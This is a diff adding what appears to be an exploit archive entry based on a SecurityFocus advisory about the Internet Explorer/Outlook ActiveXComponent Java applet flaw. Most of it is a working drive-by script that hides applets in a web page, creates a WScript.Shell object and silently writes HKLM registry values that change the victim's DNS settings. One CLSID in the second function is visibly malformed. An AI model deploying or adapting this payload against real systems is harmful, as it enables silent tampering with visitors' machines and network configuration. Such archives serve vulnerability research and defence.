@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/1754/info
+
+If a malicious website operator were to embed a specially crafted java object into a HTML document, it would be possible to execute arbitrary programs on a target host viewing the webpage through either Microsoft Internet Explorer or Outlook. The com.ms.activeX.ActiveXComponent java object inserted into an <APPLET> tag will allow the creation and scripting of arbitrary ActiveX objects even if they may present security hazards.
+
+Even if Outlook has had the 'security update' applied, it is still possible to circumvent the disabling of active script execution through the use of java.
+
+Execution of arbitrary programs could make it possible for the malicious website operator to gain rights equivalent to those of the current user. 
+
+<script>
+document.write("<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>");
+function yuzi3(){
+try{
+a1=document.applets[0];
+a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
+a1.createInstance();Shl = a1.GetObject();
+a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
+try{
+
+Shl.RegWrite("HKLM\\System\\CurrentControlSet\\Services\\VxD\\MSTCP\\SearchList","roots-servers.net");
+}
+catch(e){}
+}
+catch(e){}
+}
+setTimeout("yuzi3()",1000);
+document.write("<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>");
+function yuzi2(){
+try{
+a2=document.applets[0];a2.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
+a2.createInstance();Shl =
+a2.GetObject();a2.setCLSID("{0D43FE01-F093-11CF-89400-0A0C9054228}");
+try{
+
+Shl.RegWrite("HKLM\\System\\CurrentControlSet\\Services\\VxD\\MSTCP\\EnableDns","1");
+}
+catch(e){}
+}
+catch(e){}
+}setTimeout("yuzi2()",1000);
+</script> 
